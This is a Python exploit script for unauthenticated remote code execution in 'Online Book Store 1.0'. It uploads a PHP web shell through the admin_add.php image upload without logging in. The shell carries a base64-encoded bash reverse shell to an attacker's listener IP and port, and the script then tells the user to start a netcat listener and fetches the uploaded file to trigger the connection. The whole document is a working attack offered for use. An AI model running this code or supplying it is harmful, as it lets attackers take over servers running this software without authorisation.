#!/usr/bin/env python3

'''
Online Book Store 1.0 - Unauthenticated Remote Code Execution
'''

import argparse
import random
import requests
import string
import sys
import base64

parser = argparse.ArgumentParser()
parser.add_argument('url', action='store', help='The URL of the target.')
parser.add_argument('listener_ip', action='store', help='listener IP address for reverse shell')
parser.add_argument('listener_port', action='store', help='listener port for reverse shell')
args = parser.parse_args()

url = args.url.rstrip('/')
random_file = ''.join(random.choice(string.ascii_letters + string.digits) for i in range(10))
base64_payload = base64.b64encode(('bash -i >& /dev/tcp/' + args.listener_ip + '/' + args.listener_port + ' 0>&1').encode("ascii")).decode("ascii")

php_payload = '<?php echo shell_exec("echo ' + base64_payload + ' | base64 -d | bash"); ?>'

file = {'image': (random_file + '.php', php_payload, 'text/php')}
print('uploading PHP web shell...')
r = requests.post(url + '/admin_add.php', files=file, data={'add':'1'}, verify=False)
input("file uploaded successfully! start listener: nc -lvnp " + args.listener_port + "\n press enter once ready...")
r = requests.get(url + '/bootstrap/img/' + random_file + '.php')
print(r)
